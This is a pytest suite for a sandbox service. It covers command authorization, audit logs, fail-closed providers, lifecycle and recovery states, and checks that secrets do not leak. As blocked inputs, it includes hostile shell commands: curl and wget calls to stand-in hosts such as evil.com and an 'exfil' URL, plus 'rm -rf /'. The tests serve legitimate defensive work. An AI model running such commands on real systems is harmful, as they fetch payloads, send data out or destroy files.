"""Tests for lifecycle management, security authorization, and audit logging."""
import json
import os
import tempfile
import pytest
from unittest.mock import patch, MagicMock
from app.sandbox.provider import FakeSandboxProvider, CelestoSandboxProvider, SandboxProviderError
from app.lifecycle import SandboxLifecycle
from app.security import authorize_command
from app.config import settings
from app import audit


# ─── Security authorization tests ───────────────────────────────────

class TestAuthorizeCommand:
    def test_allows_basic_commands(self):
        assert authorize_command("echo hello") is True
        assert authorize_command("ls -la") is True
        assert authorize_command("cat /tmp/output.txt") is True
        assert authorize_command("python3 script.py") is True

    def test_blocks_curl(self):
        assert authorize_command("curl http://evil.com") is False
        assert authorize_command("curl https://anything.com/data") is False

    def test_blocks_wget(self):
        assert authorize_command("wget http://evil.com/payload") is False

    def test_blocks_rm_rf_root(self):
        assert authorize_command("rm -rf /") is False

    def test_blocks_empty(self):
        assert authorize_command("") is False
        assert authorize_command(None) is False

    def test_blocks_non_string(self):
        assert authorize_command(123) is False


# ─── Audit log tests ────────────────────────────────────────────────

class TestAudit:
    def test_log_creates_entry(self, tmp_path):
        log_file = str(tmp_path / "test_commands.jsonl")
        with patch.object(audit, "LOG_PATH", log_file):
            audit.log_command("sbx-testaudit01", "echo hi", "allow", "celesto_sandbox")
            with open(log_file) as f:
                entry = json.loads(f.readline())
            assert entry["sandbox_name"] == "sbx-testaudit01"
            assert entry["command"] == "echo hi"
            assert entry["decision"] == "allow"
            assert entry["execution_target"] == "celesto_sandbox"
            assert "ts" in entry

    def test_blocked_command_logged(self, tmp_path):
        log_file = str(tmp_path / "test_commands.jsonl")
        with patch.object(audit, "LOG_PATH", log_file):
            audit.log_command("sbx-testblock01", "curl http://evil.com", "block", "celesto_sandbox")
            with open(log_file) as f:
                entry = json.loads(f.readline())
            assert entry["decision"] == "block"


# ─── Provider fail-closed tests ─────────────────────────────────────

class TestProviderFailClosed:
    def test_disabled_provider_rejects_create(self):
        with patch.object(settings, "celesto_api_key", ""):
            provider = CelestoSandboxProvider()
            assert provider.mode == "disabled"
            with pytest.raises(SandboxProviderError, match="not configured"):
                provider.create_sandbox("sbx-shouldfail1")

    def test_disabled_provider_rejects_execute(self):
        with patch.object(settings, "celesto_api_key", ""):
            provider = CelestoSandboxProvider()
            with pytest.raises(SandboxProviderError, match="not configured"):
                provider.execute_command({"sandbox_name": "sbx-test00001"}, "echo hi")

    def test_disabled_provider_rejects_cleanup(self):
        with patch.object(settings, "celesto_api_key", ""):
            provider = CelestoSandboxProvider()
            with pytest.raises(SandboxProviderError, match="not configured"):
                provider.cleanup({"sandbox_name": "sbx-test00001"})


# ─── Fake provider tests ────────────────────────────────────────────

class TestFakeProvider:
    def test_create_returns_handle(self):
        provider = FakeSandboxProvider()
        handle = provider.create_sandbox("sbx-faketest01")
        assert handle["sandbox_name"] == "sbx-faketest01"
        assert handle["mode"] == "fake"

    def test_execute_allowed(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        with patch.object(audit, "LOG_PATH", log_file):
            provider = FakeSandboxProvider()
            handle = provider.create_sandbox("sbx-faketest02")
            result = provider.execute_command(handle, "echo hello")
            assert result["exit_code"] == 0

    def test_execute_blocked(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        with patch.object(audit, "LOG_PATH", log_file):
            provider = FakeSandboxProvider()
            handle = provider.create_sandbox("sbx-faketest03")
            with pytest.raises(PermissionError):
                provider.execute_command(handle, "curl http://evil.com")

    def test_cleanup(self):
        provider = FakeSandboxProvider()
        handle = provider.create_sandbox("sbx-faketest04")
        assert provider.cleanup(handle) is True


# ─── Lifecycle tests (with fake provider) ────────────────────────────

class TestLifecycle:
    def test_successful_run(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        trace_file = str(tmp_path / "trace.jsonl")
        with patch.object(audit, "LOG_PATH", log_file), \
             patch("app.lifecycle.TRACE_PATH", trace_file):
            provider = FakeSandboxProvider()
            lc = SandboxLifecycle("sbx-lifecycle01", provider=provider)
            # Run with no failure injection (inject_failure_at=-1)
            result = lc.run(["echo a", "echo b", "echo c"], inject_failure_at=-1)
            assert result["state"] == "Succeeded"
            assert lc.state == "Succeeded"
            assert lc.cleanup() is True
            assert lc.state == "Deleted"

    def test_step7_failure(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        trace_file = str(tmp_path / "trace.jsonl")
        with patch.object(audit, "LOG_PATH", log_file), \
             patch("app.lifecycle.TRACE_PATH", trace_file):
            provider = FakeSandboxProvider()
            steps = [f"step {i}" for i in range(1, 11)]
            lc = SandboxLifecycle("sbx-failtest01", provider=provider)
            with pytest.raises(RuntimeError, match="Injected failure at step 7"):
                lc.run(steps, inject_failure_at=7)
            assert lc.state == "Failed"
            # Verify trace events
            with open(trace_file) as f:
                events = [json.loads(line) for line in f if line.strip()]
            assert any(e["event"] == "failure_detected" and e["step"] == 7 for e in events)

    def test_cleanup_on_failure(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        trace_file = str(tmp_path / "trace.jsonl")
        with patch.object(audit, "LOG_PATH", log_file), \
             patch("app.lifecycle.TRACE_PATH", trace_file):
            provider = FakeSandboxProvider()
            lc = SandboxLifecycle("sbx-cleanup01", provider=provider)
            try:
                lc.run([f"step {i}" for i in range(1, 11)], inject_failure_at=7)
            except RuntimeError:
                pass
            assert lc.cleanup() is True
            assert lc.state == "Deleted"

    def test_fresh_recovery(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        trace_file = str(tmp_path / "trace.jsonl")
        with patch.object(audit, "LOG_PATH", log_file), \
             patch("app.lifecycle.TRACE_PATH", trace_file):
            provider = FakeSandboxProvider()
            steps = [f"step {i}" for i in range(1, 11)]
            lc = SandboxLifecycle("sbx-recover01", provider=provider)
            try:
                lc.run(steps, inject_failure_at=7)
            except RuntimeError:
                pass
            # Apply fresh recovery
            result = lc.recover_fresh(steps, "sbx-recover02")
            assert result["state"] == "Succeeded"
            # Verify trace has policy_applied event
            with open(trace_file) as f:
                events = [json.loads(line) for line in f if line.strip()]
            assert any(e["event"] == "policy_applied" and e["policy"] == "fresh" for e in events)

    def test_invalid_state_transition(self, tmp_path):
        log_file = str(tmp_path / "cmd.jsonl")
        with patch.object(audit, "LOG_PATH", log_file):
            provider = FakeSandboxProvider()
            lc = SandboxLifecycle("sbx-badtrans01", provider=provider)
            with pytest.raises(ValueError, match="Invalid state transition"):
                lc._transition("Running")  # Can't go Created -> Running


# ─── Regression & Error Handling Tests ─────────────────────────────────

from app.sandbox.provider import CelestoPaymentRequiredError


class TestProviderRegressionAndErrorHandling:
    def test_http_402_raises_payment_required(self):
        from app.config import settings
        with patch.object(settings, "celesto_api_key", "sk_test_mock_key"), \
             patch.object(settings, "celesto_provider", "celesto_cloud"):
            provider = CelestoSandboxProvider()
            
            # Mock CloudComputer raising CloudAPIError with 402
            mock_cc = MagicMock()
            from celesto import CloudAPIError
            mock_cc.start.side_effect = CloudAPIError(402)
            
            with patch("celesto.CloudComputer", return_value=mock_cc):
                with pytest.raises(CelestoPaymentRequiredError) as exc_info:
                    provider.create_sandbox("sbx-payreq001")
                assert "HTTP 402 Payment Required" in str(exc_info.value)
                assert "sk_test_mock_key" not in str(exc_info.value)

    def test_partial_creation_cleanup_on_failure(self):
        from app.config import settings
        with patch.object(settings, "celesto_api_key", "sk_test_key"), \
             patch.object(settings, "celesto_provider", "celesto_cloud"):
            provider = CelestoSandboxProvider()
            
            mock_cc = MagicMock()
            mock_cc.start.side_effect = RuntimeError("Boot failure after allocate")
            
            with patch("celesto.CloudComputer", return_value=mock_cc):
                with pytest.raises(SandboxProviderError):
                    provider.create_sandbox("sbx-bootfail01")
                # Verify that cleanup / delete was called on the partially created VM
                mock_cc.delete.assert_called_once()

    def test_command_timeout_handling(self):
        from app.config import settings
        with patch.object(settings, "celesto_api_key", "sk_test_key"), \
             patch.object(settings, "celesto_provider", "celesto_cloud"):
            provider = CelestoSandboxProvider()
            
            mock_vm = MagicMock()
            mock_vm.run.side_effect = TimeoutError("Command timed out")
            handle = {"sandbox_name": "sbx-timeout01", "_vm": mock_vm}
            
            with patch("app.security.authorize_command", return_value=True):
                with pytest.raises(SandboxProviderError) as exc_info:
                    provider.execute_command(handle, "sleep 100", timeout_s=5)
                assert "timed out after 5s" in str(exc_info.value)

    def test_lifecycle_marks_failed_on_create_error(self):
        # When create_sandbox raises, lifecycle must set state = Failed
        failing_provider = MagicMock()
        failing_provider.create_sandbox.side_effect = SandboxProviderError("Allocation failed")
        
        lc = SandboxLifecycle("sbx-allocfail1", provider=failing_provider)
        with pytest.raises(SandboxProviderError):
            lc.run(["echo a"])
        assert lc.state == "Failed"
        assert lc.error == "Allocation failed"

    def test_no_secret_leak_in_exception_strings(self):
        from app.config import settings
        secret_key = "cel_pat_super_secret_test_value_12345"
        with patch.object(settings, "celesto_api_key", secret_key), \
             patch.object(settings, "celesto_provider", "celesto_cloud"):
            provider = CelestoSandboxProvider()
            
            mock_cc = MagicMock()
            mock_cc.start.side_effect = Exception("General error mentioning no key")
            with patch("celesto.CloudComputer", return_value=mock_cc):
                try:
                    provider.create_sandbox("sbx-secretcheck")
                except SandboxProviderError as e:
                    assert secret_key not in str(e)


class TestCelestoCallbacksAndFeatures:
    def test_safety_guard_callback_allows_safe_command(self):
        from app.security import CelestoSafetyGuard
        guard = CelestoSafetyGuard("sbx-cbtest1")
        ctx = MagicMock(command="echo safe", vm_id="sbx-cbtest1")
        # Should not raise
        guard.on_pre_run(ctx)
        guard.on_post_run(ctx)

    def test_safety_guard_callback_blocks_unsafe_command(self):
        from app.security import CelestoSafetyGuard, CommandBlockedError
        guard = CelestoSafetyGuard("sbx-cbtest2")
        ctx = MagicMock(command="curl http://malicious.internal/exfil", vm_id="sbx-cbtest2")
        with pytest.raises(CommandBlockedError) as exc_info:
            guard.on_pre_run(ctx)
        assert "Blocked unsafe command" in str(exc_info.value)

    def test_fake_provider_snapshot_and_restore(self):
        provider = FakeSandboxProvider()
        handle = provider.create_sandbox("sbx-snap01")
        snap = provider.create_snapshot(handle, "snap-checkpoint-1")
        assert snap["snapshot_id"] == "snap-checkpoint-1"
        assert snap["status"] == "saved"

        restored = provider.restore_snapshot("snap-checkpoint-1", "sbx-snap01-restored")
        assert restored["status"] == "ready"
        assert restored["snapshot_id"] == "snap-checkpoint-1"

    def test_fake_provider_browser_url(self):
        provider = FakeSandboxProvider()
        handle = provider.create_sandbox("sbx-browser01")
        url = provider.get_browser_url(handle)
        assert "http" in url


